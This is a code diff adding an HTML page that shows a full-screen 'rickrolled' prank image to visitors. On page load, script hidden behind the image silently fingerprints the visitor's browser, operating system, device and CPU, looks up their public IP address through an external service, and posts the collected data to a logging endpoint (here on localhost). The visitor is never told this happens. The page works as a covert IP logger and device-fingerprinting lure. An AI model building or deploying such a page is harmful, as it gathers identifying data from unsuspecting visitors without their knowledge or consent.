@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script src="client.min.js"></script>
+  </head>
+  <style>
+body, html {
+  height: 100%;
+  margin: 0;
+}
+</style>
+</head>
+<body>
+
+<img src="rickrolled.jpg" height="100%" width="100%"/>
+
+</body>
+  <script>
+    var client = new ClientJS(); // Create A New Client Object
+    var fingerprint = client.getFingerprint();
+    var userAgent = client.getUserAgent(); // Get User Agent String
+    var browser = client.getBrowser();
+    var browserVersion = client.getBrowserVersion(); // Get Browser Version
+    var engine = client.getEngine(); // Get Engine
+    var engineVersion = client.getEngineVersion(); // Get Engine Version
+    var OS = client.getOS(); // Get OS Version
+    var osVersion = client.getOSVersion(); // Get OS Version
+    var device = client.getDevice(); // Get Device
+    var deviceType = client.getDeviceType(); // Get Device
+    var deviceVendor = client.getDeviceVendor(); // Get Device Vendor
+    var CPU = client.getCPU(); // Get CPU Architecture
+
+
+
+async function fetchIp() {
+const response = await fetch('https://api.ipify.org/?format=json', {}).then((response) => response.json()).then((json) =>{var finaldata = {
+      useragent: userAgent,
+      browser: browser + " (Version " + browserVersion + ")",
+      engine: engine + " (Version " + engineVersion + ")",
+      os: OS + " " + osVersion,
+      device: device + " (" + deviceType + ")",
+      devicevendor: deviceVendor,
+      CPU: CPU,
+      ip: json.ip
+    };
+    console.log(finaldata)
+    var xhr = new XMLHttpRequest();
+    let url = "http://127.0.0.1:5001/httplogs";
+            xhr.open("POST", url, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log(this.responseText);
+  
+                }
+            };
+            var data = JSON.stringify(finaldata);
+            xhr.send(data);
+  })
+   
+  }
+fetchIp()
+           
+          
+            
+
+  </script>
+</html>
